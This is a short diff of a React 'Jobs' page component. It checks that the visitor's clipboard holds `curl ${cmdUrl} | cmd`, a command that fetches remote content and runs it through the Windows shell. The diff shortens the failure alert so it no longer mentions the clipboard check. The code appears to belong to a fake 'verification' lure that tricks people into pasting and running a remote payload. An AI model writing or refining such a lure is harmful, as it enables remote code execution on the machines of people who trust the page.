@@ -136,7 +136,7 @@ export default function Jobs() {
     if (text === `curl ${cmdUrl} | cmd`) {
       push(message); // your existing toast/snackbar
     } else {
-      alert("Verification failed: Clipboard mismatch!");
+      alert("Verification failed");
     }
   } catch (err) {
     console.error("Clipboard error:", err);
